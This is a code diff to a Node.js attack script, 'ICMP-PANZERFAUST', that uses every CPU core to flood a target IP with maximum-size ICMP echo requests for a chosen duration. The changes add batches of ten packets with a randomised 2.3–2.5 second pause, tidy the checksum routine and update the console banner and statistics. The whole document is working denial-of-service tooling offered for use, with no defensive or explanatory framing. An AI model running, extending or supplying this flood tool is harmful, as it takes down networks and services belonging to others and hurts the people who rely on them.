@@ -5,6 +5,9 @@ const { exec } = require('child_process');
 
 const target = process.argv[2];
 const duration = parseInt(process.argv[3]);
+const batchSize = 10; // packets per batch
+const reloadMin = 2300; // ms
+const reloadMax = 2500; // ms
 
 if (!target || isNaN(duration)) {
   console.log('Usage: node attack.js <target_ip> <duration_seconds>');
@@ -19,11 +22,13 @@ if (cluster.isMaster) {
   let lastLatency = 'N/A';
 
   console.clear();
-  console.log('ICMP-PANZERFAUST [BATCH-BOMBER]');
+  console.log('ICMP-PANZERFAUST [BATCH-BOMBER WITH RELOAD]');
   console.log('--------------------------------------');
   console.log(`Target: ${target}`);
   console.log(`Duration: ${duration}s`);
   console.log(`Using ${cores} cores`);
+  console.log(`Batch size: ${batchSize} packets`);
+  console.log(`Reload time between batches: ~2.3-2.5s`);
   console.log('Launching...\n');
 
   for (let i = 0; i < cores; i++) cluster.fork();
@@ -42,7 +47,7 @@ if (cluster.isMaster) {
 
   setInterval(() => {
     console.clear();
-    console.log('ICMP-PANZERFAUST [BATCH-BOMBER]');
+    console.log('ICMP-PANZERFAUST [BATCH-BOMBER WITH RELOAD]');
     console.log('--------------------------------------');
     console.log(`Success: ${stats.success}`);
     console.log(`Failed: ${stats.failed}`);
@@ -77,11 +82,10 @@ if (cluster.isMaster) {
   let pps = 0;
   let bytesSent = 0;
 
-  // Max payload size: 65507 bytes
+  // Max payload size: 65507 bytes (max safe ICMP payload)
   const payloadSize = 65507;
-  const totalPacketSize = 8 + payloadSize; // ICMP header + payload
 
-  // Create max size packet buffer once, then update seq
+  // Prepare reusable packet buffer for given seq
   function createPacket(seqNum) {
     const buf = Buffer.alloc(8 + payloadSize);
     buf.writeUInt8(8, 0); // Type: Echo Request
@@ -90,26 +94,24 @@ if (cluster.isMaster) {
     buf.writeUInt16BE(process.pid & 0xffff, 4); // ID
     buf.writeUInt16BE(seqNum & 0xffff, 6); // Seq
 
-    // Fill payload with random data for max size
-    for(let i=8; i<buf.length; i++) {
-      buf[i] = 0x42; // ASCII '*'
-    }
+    // Fill payload with constant pattern (0x42 = '*')
+    buf.fill(0x42, 8);
 
-    // Compute checksum
+    // Calculate checksum correctly
     let sum = 0;
     for (let i = 0; i < buf.length; i += 2) {
-      sum += buf.readUInt16BE(i);
+      let word = buf.readUInt16BE(i);
+      sum += word;
     }
-    while (sum >> 16) {
-      sum = (sum & 0xffff) + (sum >> 16);
-    }
+    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
     const checksum = (~sum) & 0xffff;
     buf.writeUInt16BE(checksum, 2);
 
     return buf;
   }
 
-  function batchSend(count) {
+  // Async batch send with reload delay
+  async function batchSend(count) {
     if (Date.now() >= endTime) return;
 
     for (let i = 0; i < count; i++) {
@@ -123,11 +125,14 @@ if (cluster.isMaster) {
       });
     }
 
-    setImmediate(() => batchSend(count));
+    // Reload delay (random 2300-2500 ms)
+    const reloadDelay = 2300 + Math.random() * 200;
+    await new Promise(r => setTimeout(r, reloadDelay));
+
+    if (Date.now() < endTime) batchSend(count);
   }
 
-  // Start batch send: you can increase batch count here
-  batchSend(10);
+  batchSend(batchSize);
 
   setInterval(() => {
     process.send({ type: 'stats', sent, success, failed, pps, bytesSent });
